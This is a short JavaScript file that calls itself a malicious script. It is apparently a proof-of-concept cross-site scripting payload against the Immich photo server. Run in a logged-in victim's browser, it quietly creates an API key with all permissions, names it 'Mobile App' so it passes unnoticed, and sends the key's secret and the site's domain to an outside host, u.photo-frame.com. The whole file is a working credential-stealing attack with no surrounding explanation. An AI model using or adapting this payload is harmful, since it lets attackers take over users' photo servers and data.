console.log("Malicious script started...");

async function createKey() {
    // to create an API key: https://api.immich.app/endpoints/api-keys/createApiKey
    const response = await fetch('/api/api-keys', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: 'Mobile App',
                               permissions: ["all"]}) 
    });
    const data = await response.json();
    
    console.log("API key created... Exfiltration...");
    
    fetch('https://u.photo-frame.com/log?key=' + data.secret + '&domain=' + document.domain, { mode: 'no-cors' });
    
    console.log("Exfiltration done!");
}

createKey();
